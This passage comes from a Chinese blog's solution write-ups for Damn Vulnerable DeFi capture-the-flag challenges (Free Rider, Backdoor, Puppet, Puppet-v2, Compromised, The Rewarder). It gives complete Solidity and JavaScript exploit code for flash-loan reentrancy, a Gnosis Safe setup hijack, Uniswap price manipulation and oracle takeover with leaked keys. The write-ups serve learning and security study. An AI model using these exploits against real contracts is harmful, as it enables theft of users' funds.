withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IFreeRiderNFTMarketplace &#123;</span><br><span class="line">    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;</span><br><span class="line">    function buyMany(uint256[] calldata tokenIds) external payable;</span><br><span class="line">    function token() external returns (IERC721);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver &#123;</span><br><span class="line"></span><br><span class="line">address public attcker;</span><br><span class="line">address immutable buyer;</span><br><span class="line">IFreeRiderNFTMarketplace immutable market;</span><br><span class="line">IUniswapV2Pair immutable uniswapPair;</span><br><span class="line">IWETH immutable weth;</span><br><span class="line">IERC721 immutable nft;</span><br><span class="line"></span><br><span class="line">    constructor(address _Buyer, IFreeRiderNFTMarketplace _market, IWETH _token, IUniswapV2Pair _uniswapPair)&#123;</span><br><span class="line">        market &#x3D; _market;</span><br><span class="line">        buyer &#x3D; _Buyer;</span><br><span class="line">        attcker &#x3D; msg.sender;</span><br><span class="line">        uniswapPair &#x3D; _uniswapPair;</span><br><span class="line">        nft &#x3D; _market.token();</span><br><span class="line">        weth &#x3D; _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uniswapPair.swap(</span><br><span class="line">            120 ether,         &#x2F;&#x2F;根据分析，我们一共需要从闪电贷借120ETH</span><br><span class="line">            0 ,                &#x2F;&#x2F;我们不关心这个参数，因为我们只用借ETH</span><br><span class="line">            address(this),     &#x2F;&#x2F;借款发送到此合约</span><br><span class="line">            hex&quot;00&quot;            &#x2F;&#x2F;为了使data不为空（我们不关心此参数）</span><br><span class="line">        );           </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;闪电贷回调函数</span><br><span class="line">    function uniswapV2Call(address, uint, uint, bytes calldata) external override &#123;</span><br><span class="line">        console.log(&quot;success in line&quot;, 62);</span><br><span class="line">        &#x2F;&#x2F;通过闪电借的120 ether先提款到此合约</span><br><span class="line">        weth.withdraw(120 ether);</span><br><span class="line">        console.log(&quot;success in line&quot;, 65);</span><br><span class="line">        &#x2F;&#x2F;先买两个NFT</span><br><span class="line">        uint256[] memory tokenids1 &#x3D; new uint256[](2);</span><br><span class="line">        tokenids1[0] &#x3D; 0;</span><br><span class="line">        tokenids1[1] &#x3D; 1;</span><br><span class="line">        market.buyMany&#123;value: 30 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;以90的价格放入市场</span><br><span class="line">        nft.setApprovalForAll(address(market), true);</span><br><span class="line">        uint256[] memory price1 &#x3D; new uint256[](2);</span><br><span class="line">        price1[0] &#x3D; 90 ether;</span><br><span class="line">        price1[1] &#x3D; 90 ether;</span><br><span class="line">        market.offerMany(tokenids1, price1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;利用重入漏洞以90ether的价格买下这两个NFT</span><br><span class="line">        market.buyMany&#123;value:90 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;还款</span><br><span class="line">        uint256 fee &#x3D; ((120 ether * 3) &#x2F; uint256(997)) + 1;</span><br><span class="line">        weth.deposit&#123;value: 120 ether + fee&#125;();</span><br><span class="line">        weth.transfer(address(uniswapPair), 120 ether + fee);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用60ETH买4个NFT</span><br><span class="line">        tokenids1 &#x3D; new uint256[](4);</span><br><span class="line">        tokenids1[0] &#x3D; 2;</span><br><span class="line">        tokenids1[1] &#x3D; 3;</span><br><span class="line">        tokenids1[2] &#x3D; 4;</span><br><span class="line">        tokenids1[3] &#x3D; 5;</span><br><span class="line">        market.buyMany&#123;value:60 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;把六个nft都给buyer</span><br><span class="line">        for(uint8 tokenId &#x3D; 0; tokenId &lt; 6; tokenId++)&#123;</span><br><span class="line">            nft.safeTransferFrom(address(this), buyer, tokenId);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        payable(address(attcker)).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) &#123;</span><br><span class="line">        return IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>总结：在合约中重用相同的内容（通常通过循环或某种批处理/多调用函数）是一个非常重要的漏洞。</li></ul><h2 id="11-Backdoor"><a href="#11-Backdoor" class="headerlink" title="11 Backdoor"></a>11 Backdoor</h2><p>这个题我花费了大量的时间！因为需要对<code>GnosisSafe</code>Wallet的源码足够了解。在做这个挑战的时候又不停的在学习有关操作码的东西，这很麻烦。我必须说这个题是我目前做到的挑战里面比较折磨我的。<br>这个挑战的背景是<a href="https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol" target="_blank" rel="noopener">Gnosis安全钱包</a>,有人部署了钱包的注册表，当此团队中的人部署钱包时，他们将获得10个token，我们要做的就是拿到着40个token</p><h3 id="Code-Review-1"><a href="#Code-Review-1" class="headerlink" title="Code Review"></a><strong>Code Review</strong></h3><p>这个挑战只有一个注册表合约，但往往看似简单的东西都挺难的。</p><ul><li><strong>WalletRegistry</strong><br>注册表合约<ul><li>addBeneficiary()<br>添加受益人到注册表的函数,beneficiaries[]就是检测是否为注册表里有的地址</li><li>_removeBeneficiary()<br>在受益人收益后从注册表删除此受益人</li><li><strong>proxyCreated</strong><br>通过注释我们可以知道这是创建钱包时会调用的一个回调函数，而这个函数的作用就是给注册表中的受益人那10个token。</li></ul></li></ul><p>看起来，重头戏并不在这里，于是我把目光投向了<code>GnosisSafe</code>钱包的源码</p><ul><li><p><strong>GnosisSafe源码</strong><br>首先我们全局搜索回调<code>proxyCreated</code>的的地方，只有一个<code>createProxyWithCallback()</code>函数</p><ul><li><strong>GnosisSafeProxyFactory</strong> -createProxyWithCallback<br><img src="Damn10_CallBack.png" alt=""><br>入参有四个：<ol><li>address _singleton<br>这是一个单例地址</li><li>bytes memory initializer<br>这是初始化器的字节码，初始化函数其实就是<code>GnosisSafe</code>里的<code>setup()</code>函数</li><li>uint256 saltNonce<br>这是Create2里的随机数，我们不用关心</li><li>IProxyCreationCallback callback<br>这是回调合约的地址<br>我们直接关注回调的地方，<code>callback.proxyCreated(proxy, _singleton, initializer, saltNonce);</code>这里只是简单的一个回调，参数看上去也没有什么漏洞。<br>然后就是在上一行调用了<code>createProxyWithNonce</code>函数</li></ol></li><li><p><strong>GnosisSafeProxyFactory</strong> -createProxyWithNonce<br>这个函数内主要其实就是对initializer初始化函数的调用，只不过是用汇编实现的。<br>看起来关键可能在于<code>setup</code>函数</p></li><li><p><strong>GnosisSafe</strong> -setup<br>这是Gnosis钱包的一个初始化函数，我一眼就看到了<code>setupModules(to, data);</code>这明显是一个外部调用，这给我了一点希望。再仔细一看这里的参数确实是可以导致借入的。我们可以借此让钱包approve给我们所有的token，我们只需要把这个token转出来即可。</p></li></ul></li><li><p><strong>Exploit</strong><br>总结一下以上的分析，其实这个题就是利用了一个gnosis钱包的一个外部调用，再钱包的上下文中执行<code>approve</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;GnosisSafeProxy.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;GnosisSafeProxyFactory.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;IProxyCreationCallback.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;GnosisSafe.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableToken.sol&quot;;</span><br><span class="line">import &quot;hardhat&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IGnosisSafe &#123;</span><br><span class="line">     function setup(</span><br><span class="line">        address[] calldata _owners,</span><br><span class="line">        uint256 _threshold,</span><br><span class="line">        address to,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        address fallbackHandler,</span><br><span class="line">        address paymentToken,</span><br><span class="line">        uint256 payment,</span><br><span class="line">        address payable paymentReceiver</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BackdoorExploit &#123;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken immutable token;</span><br><span class="line">    GnosisSafeProxyFactory immutable gnosisFactory;</span><br><span class="line">    address registryAddress;</span><br><span class="line">    address masterCopyAddress;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _registryAddress,</span><br><span class="line">        address _masterCopyAddress,</span><br><span class="line">        address _walletFactory,</span><br><span class="line">        address _token</span><br><span class="line">    )&#123;</span><br><span class="line">        token &#x3D; DamnValuableToken(_token);</span><br><span class="line">        gnosisFactory &#x3D; GnosisSafeProxyFactory(_walletFactory);</span><br><span class="line">        registryAddress &#x3D; _registryAddress;</span><br><span class="line">        masterCopyAddress &#x3D; _masterCopyAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function GiveApprove(address _token, address _spender) external &#123;</span><br><span class="line">        DamnValuableToken(_token).approve(_spender, 10 * 10**18);</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The spender&#39;s address :&quot;, _spender);</span><br><span class="line">        console.log(&quot;The Giver&#39;s address:&quot;, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function creatWallet(address[] memory victims)external returns (address newproxy)&#123;</span><br><span class="line">        address[] memory owner &#x3D; new address[](1);</span><br><span class="line">        for(uint8 i &#x3D; 0; i &lt; victims.length; i++)&#123;</span><br><span class="line">            owner[0] &#x3D; victims[i];</span><br><span class="line">            bytes memory init &#x3D; abi.encodeWithSelector(</span><br><span class="line">                GnosisSafe.setup.selector, </span><br><span class="line">                owner,                                      &#x2F;&#x2F;新建钱包的owner</span><br><span class="line">                1,                                          &#x2F;&#x2F;threshold 只能为1</span><br><span class="line">                address(this),                              &#x2F;&#x2F;漏洞出现点</span><br><span class="line">                abi.encodeWithSelector(                     &#x2F;&#x2F;借入</span><br><span class="line">                    BackdoorExploit.GiveApprove.selector, </span><br><span class="line">                    address(token),</span><br><span class="line">                    address(this)</span><br><span class="line">                ),</span><br><span class="line">                address(0x0),</span><br><span class="line">                address(0x0),</span><br><span class="line">                0,</span><br><span class="line">                address(0x0)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        GnosisSafeProxy proxy &#x3D;  gnosisFactory.createProxyWithCallback(</span><br><span class="line">            masterCopyAddress,</span><br><span class="line">            init,</span><br><span class="line">            i,</span><br><span class="line">            IProxyCreationCallback(registryAddress)</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The msg.sender&#39;s address:&quot;, msg.sender);</span><br><span class="line">        console.log(&quot;The proxy&#39;s address:&quot;, address(proxy));</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The this address:&quot;, address(this));</span><br><span class="line">        DamnValuableToken(token).transferFrom(address(proxy), msg.sender, 10 *10**18);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 8-9</title>
      <link href="/DamnDefi-08-09/"/>
      <url>/DamnDefi-08-09/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-8-9"><a href="#Damn-Defi靶场刷题记录-8-9" class="headerlink" title="Damn Defi靶场刷题记录(8-9)"></a>Damn Defi靶场刷题记录(8-9)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="8-Puppet"><a href="#8-Puppet" class="headerlink" title="8 Puppet"></a>8 Puppet</h2><p>这个题直接通过abi引用了一个已经编译了的Uniswap v1的合约，因此，我们可以假定这个Uniswap合约没有其他漏洞。<br>那就让我们把目光集中在<code>PuppetPool</code>合约<br>其实就一个<code>borrow()</code>函数，但在借款时，我们需要抵押两倍的资金在池里。这个题其实就是想要我们想办法让池在我们抵押不足的情况下贷款给我们。<br>这其实就涉及到uniswap的原理了，有关uniswap v1我推荐看<a href="https://bbs.csdn.net/topics/606753811" target="_blank" rel="noopener">这篇文章</a><br>在了解了uniswap v1后，我们就应该知道，流动性对于一个uniswap池有多么重要，而题目中的这个池，其实并没有足够多的流动性来应对大规模的买进卖出。</p><blockquote><p>因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。</p></blockquote><ul><li><strong>Exploit</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);</span><br><span class="line">        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(</span><br><span class="line">            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),</span><br><span class="line">            1,</span><br><span class="line">            9999999999</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; 先计算borrow所有的token需要多少的eth</span><br><span class="line">        const amount &#x3D; await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, &#123;value:amount&#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="9-Puppet-v2"><a href="#9-Puppet-v2" class="headerlink" title="9 Puppet-v2"></a>9 Puppet-v2</h2><p>相比于上一道题，这次使用的时Uniswap-v2的源码，而交易所借款需要抵押的eth从借款价格的2倍变为了3倍。<br>但其实再了解Uniswap-v2以及这次的交易所代码后，发现其实和上道题没有本质的区别。<br>我们任然可以利用池中流动性不足这一点，引起价格的波动，使token贬值，以达到我们以少数eth借到大量token的目的。</p><ul><li><strong>Exploit</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">       &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);</span><br><span class="line">       &#x2F;&#x2F; 在交易所置换自己所有的token</span><br><span class="line">       await this.uniswapRouter.connect(attacker).swapExactTokensForETH(</span><br><span class="line">           ATTACKER_INITIAL_TOKEN_BALANCE,</span><br><span class="line">           0,</span><br><span class="line">           [this.token.address, this.uniswapRouter.WETH()],</span><br><span class="line">           attacker.address,</span><br><span class="line">           9999999999</span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       console.log(&#39;Attacker&#96;s balance:&#39;, (await ethers.provider.getBalance(attacker.address)).toString());</span><br><span class="line">       &#x2F;&#x2F;计算borrow所有token所需要的eth</span><br><span class="line">       const amount &#x3D; await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">       &#x2F;&#x2F;先往钱包里存钱</span><br><span class="line">       await this.weth.connect(attacker).deposit(&#123;value:amount&#125;);</span><br><span class="line">       await this.weth.connect(attacker).approve(this.lendingPool.address, amount);</span><br><span class="line">       await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 7</title>
      <link href="/DamnDefi-07/"/>
      <url>/DamnDefi-07/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-7"><a href="#Damn-Defi靶场刷题记录-7" class="headerlink" title="Damn Defi靶场刷题记录(7)"></a>Damn Defi靶场刷题记录(7)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="7-Compromised"><a href="#7-Compromised" class="headerlink" title="7 Compromised"></a>7 Compromised</h2><p>之所以单独把这个题拉出来做一个wp是因为这个题太特殊了，也因为8，9是一套题目。<br>这个题设置的背景就很奇怪，它给了我们一个服务器的响应片段，而这些片段是由两大串十六进制数组成的。<br>而我们目前并不知道这串十六进制数意味着什么，那么先来看看代码吧。</p><blockquote><p>通过粗略阅读后我们可以发现，这其实就是三个所谓的“可信报告者”所组成的一个预言机系统，最终的定价会以三个人的中位数为准，那么也就意味着我们只要控制两个人的行为，就可以操控价格。（想一想之前给的两串十六进制数，是不是能想到点什么呢？）</p></blockquote><p>再来看合约</p><ul><li><strong>TrustfulOracleInitializer</strong><br>这只是一个TrustfulOracle的初始化合约，没有什么内容</li><li><strong>TrustfulOracle</strong><br>这个预言机值得我们仔细阅读，首先，这个合约拓展了openzeppelin库的<code>AccessControlEnumerable.sol</code>，用来实现权限的管理，因为只有初始化的三个可信报告者可以定价。<br>这个预言机合约几乎提供了所有的可以修改价格的函数，报告者通过<code>postPrice()</code>来设定自己的价格，而<code>getMedianPrice()</code>是交易所来获取三个可信者定价中位数的函数，并以此来作为该交易的价格。</li></ul><p>似乎没有一个有明显漏洞的地方可以利用，我们不得不重新回到原点重新思考，也许题目中给的两串十六进制数会有重大作用。<br>那我们就从这两串十六进制数入手，先把这十六进制数通过ascii码转换一下：<br><code>MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5</code><br><code>MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4</code><br>得到了两串“啥也不是”的字符串，但还不甘心，于是想这任然可能是编码后的结果，于是就拿到工具里一个一个解码尝试，最终发现base64解码出来后是一个类似于私钥的字符串<br><code>0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</code><br><code>0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</code><br>再次拿着字符串去做公钥的计算，发现竟然和题目中的两个可信报告者公钥一致！那么我们就等于是拿到了两个可信者的公钥，我们现在就是可信者！<br>那么到此，此题迎刃而解，我们通过获取机制中超过半数的控制权，获得了定价的权利。</p><ul><li><strong>Exploit</strong><br>由于我们获取了定价的权利，因此我们可以用几乎为0的价格买入NFT而以巨大的金额卖出它！<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;        </span><br><span class="line">       &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">       &#x2F;&#x2F;用二者私钥创建钱包</span><br><span class="line">       const sources1 &#x3D; new ethers.Wallet(&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;, ethers.provider);</span><br><span class="line">       const sources2 &#x3D; new ethers.Wallet(&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;, ethers.provider);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;将NFT价格设置为1wei</span><br><span class="line">       await this.oracle.connect(sources1).postPrice(&quot;DVNFT&quot;, 1);</span><br><span class="line">       await this.oracle.connect(sources2).postPrice(&quot;DVNFT&quot;, 1);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;买入</span><br><span class="line">       await this.exchange.connect(attacker).buyOne(&#123;value:1&#125;);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;重新将价格设置为exchange合约的总余额</span><br><span class="line">       _balance &#x3D;  ethers.provider.getBalance(this.exchange.address);</span><br><span class="line">       await this.oracle.connect(sources1).postPrice(&quot;DVNFT&quot;, _balance);</span><br><span class="line">       await this.oracle.connect(sources2).postPrice(&quot;DVNFT&quot;, _balance);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;卖出</span><br><span class="line">       await this.nftToken.connect(attacker).approve(this.exchange.address, 0);</span><br><span class="line">       await this.exchange.connect(attacker).sellOne(0);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;重新把NFT价格复原</span><br><span class="line">       await this.oracle.connect(sources1).postPrice(&quot;DVNFT&quot;, INITIAL_NFT_PRICE);</span><br><span class="line">       await this.oracle.connect(sources2).postPrice(&quot;DVNFT&quot;, INITIAL_NFT_PRICE);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 5-6</title>
      <link href="/DamnDefi-05-06/"/>
      <url>/DamnDefi-05-06/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-5-6"><a href="#Damn-Defi靶场刷题记录-5-6" class="headerlink" title="Damn Defi靶场刷题记录(5-6)"></a>Damn Defi靶场刷题记录(5-6)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="the-rewarder"><a href="#the-rewarder" class="headerlink" title="the-rewarder"></a>the-rewarder</h2><p>FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。<br>这道题有四个合约，是第一道多合约的题目。不过不用害怕，我们一个一个来分析。</p><ul><li><strong>RewardToken</strong><br>这是一个简单的ERC20的Token，没有什么问题。唯一的区别就是这个奖励币可以被无限铸造。</li><li><strong>AccountingToken</strong><br>这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。不过看上去也没有问题。</li><li><strong>FlashLoanerPool</strong><br>这是比较常见的闪电贷池，让我们来具体看看它是怎么实现的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; liquidityToken.balanceOf(address(this));</span><br><span class="line">        require(amount &lt;&#x3D; balanceBefore, &quot;Not enough token balance&quot;);</span><br><span class="line"></span><br><span class="line">        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        </span><br><span class="line">        liquidityToken.transfer(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        msg.sender.functionCall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveFlashLoan(uint256)&quot;,</span><br><span class="line">                amount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        require(liquidityToken.balanceOf(address(this)) &gt;&#x3D; balanceBefore, &quot;Flash loan not paid back&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>明显的，出现了外部调用，这应该立马引起我们的警觉，这意味着我们可能利用<code>receiveFlashLoan()</code>函数干一些坏事。</li><li><strong>TheRewarderPool</strong><br>这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。<blockquote><p>存款会触发奖励分配功能。 首先检查是否经过了足够的时间来开始新一轮，如果是，它将创建快照。无论哪种方式，它都会根据他与所有其他用户的存款金额来计算呼叫者的奖励。然后，它检查调用方是否已经检索到当前回合的奖励，如果没有，则铸造计算出的奖励代币数量。</p></blockquote></li></ul><p>在了解了工作原理之后，我注意到了这个问题：如果你的时间安排得当，并用你的存款开始新一轮，<strong>你可以立即领取该轮的奖励并退出</strong>。从另一份合同中完成所有这些操作，这意味着在一次交易中，您可以使用闪回符并索取大部分奖励。</p><ul><li><strong>Exploit</strong><br>闪电贷函数有一个外部调用可以被我们利用，而奖励池里我们只需要存款进去，就可以立即获取奖励并退出。<blockquote><p>那么我们就可以从闪电贷池里jiu借钱存到奖励池里，领取奖励后取款，最后把钱还给借贷池就大功告成了。</p></blockquote></li></ul><p>来看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import 